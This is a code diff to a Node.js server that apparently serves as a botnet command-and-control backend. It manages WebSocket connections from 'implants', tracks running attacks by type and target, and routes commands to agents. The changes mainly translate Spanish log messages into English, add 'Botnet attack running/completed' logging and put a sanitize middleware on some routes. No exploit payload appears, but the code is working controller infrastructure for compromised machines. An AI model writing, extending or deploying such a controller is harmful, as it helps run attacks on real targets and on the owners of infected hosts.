@@ -14,8 +14,8 @@ import cors from 'cors';
 import jwt from 'jsonwebtoken';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import fs from 'fs';
 import { readLastLines, writeLog } from './routes/writeLog.mjs';
+import sanitize from './middlewares/sanitize.mjs';
 
 
 
@@ -35,19 +35,18 @@ const webSocketsServer = async (httpServer, attacks_running) => {
       const token = url.searchParams.get('token');
 
 
-      if (rol === 'usuario') {
+      if (rol === 'user') {
         try {
           const decoded = jwt.verify(token, process.env.SEED); // valida y decodifica el JWT
 
           users.add(socket);
 
           socket.on('close', () => {
-            console.log('Usuario desconectado');
             users.delete(socket);
           });
 
         } catch (err) {
-          console.log('Token inválido:', err.message);
+          console.log('Invalid JWT', err.message);
           socket.send('invalid')
           socket.close(); // cerrar conexión si el token es inválido
         }
@@ -57,9 +56,9 @@ const webSocketsServer = async (httpServer, attacks_running) => {
 
 
 
-      // Si es agente
+      // Si es Agent
       if (!clientId) {
-        console.log("Cliente sin ID, cerrando");
+        console.log("Client with no ID, closing..");
         socket.close();
         return;
       }
@@ -67,11 +66,11 @@ const webSocketsServer = async (httpServer, attacks_running) => {
       
 
       if (agents.has(clientId)) {
-        writeLog(`Agente ${clientId} ya conectado. Reemplazando conexión.`)
+        writeLog(`Agent ${clientId} already connected replacing connection.`)
         agents.get(clientId).terminate();
       }
       
-      writeLog(` | Agente conectado con ID: ${clientId}`)
+      writeLog(` | Agent connected with ID: ${clientId}`)
       
       events.push();
       
@@ -84,17 +83,17 @@ const webSocketsServer = async (httpServer, attacks_running) => {
           
         
           if(!data_parsed.error) {
-            console.log(data_parsed);
             
             if(data_parsed.status === 'attack_completed') {
               // Filtrar para REMOVER el ataque completado
               // Si el mensaje del implante falla, el controller limpia el estado de running_attacks en el backend
+               writeLog(` | Botnet ${data_parsed.attack_type} attack completed`)
                attacks_running.attacks = attacks_running.attacks.filter(a => 
                       a.attack_type !== data_parsed.attack_type || 
                       a.target !== data_parsed.target
                     ); 
                   } else if(data_parsed.status === 'attack_running') {
-                    
+                    writeLog(` | Botnet ${data_parsed.attack_type} attack running`)
                     // Solo agregar si es un nuevo ataque
                   const exists = attacks_running.attacks.some(a => 
                       a.attack_type === data_parsed.attack_type && 
@@ -112,28 +111,24 @@ const webSocketsServer = async (httpServer, attacks_running) => {
 
 
       socket.on('close', () => {
-        writeLog(` | Agente ${clientId} desconectado`)
+        writeLog(` | Agent ${clientId} disconnected`)
         agents.delete(clientId);
       });
     });
 
-    // Intervalo para verificar estado de los agents y notificar users
     const interval = setInterval(async () => {
-      const db_clients = await Implant.find(); // Asumo que `clients` es una colección de DB
+      const db_clients = await Implant.find(); 
 
       
       const client_db_list = db_clients.map(x => x);
       const status_connections = [];
 
 
-  /*     for (const key of agents.keys()) {
-        console.log("socket:",key);
-      }
-       */
+
       client_db_list.forEach((c) => {
         /* console.log("db:",c.impl_id); */
         
-        //Estado de los agentes
+        //Agents status
         const ws = agents.get(c.impl_id);
         if (ws) {
           if (ws.isAlive) {
@@ -170,7 +165,7 @@ const webSocketsServer = async (httpServer, attacks_running) => {
     return { agents };
 
   } catch (error) {
-    console.error('Error en WebSocket server:', error);
+    console.error('Error in websocket server', error);
     return false;
   }
 };
@@ -202,16 +197,15 @@ const main = async () =>{
     const server = http.createServer(app);
     const {agents} = await webSocketsServer(server, attacks_running)
     
-    app.use('/api/auth', authRouter)
+    app.use('/api/auth', sanitize, authRouter)
     app.use('/api/rcv', cmd_router(agents, attacks_running))
-    app.use('/api/impl', implant_router())
-    app.use('/api/artifacts', artifacts_router())
+    app.use('/api/impl', sanitize, implant_router())
+    app.use('/api/artifacts', sanitize,artifacts_router())
     //------Type errors-----
     app.use(type_errors);
     app.use(syntax_errors);
     
-    server.listen(process.env.PORT, '0.0.0.0', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
+    server.listen(process.env.PORT, '0.0.0.0', ()=> console.log(`Listening in port:  ${process.env.PORT}`))
 
 }
 main()
-
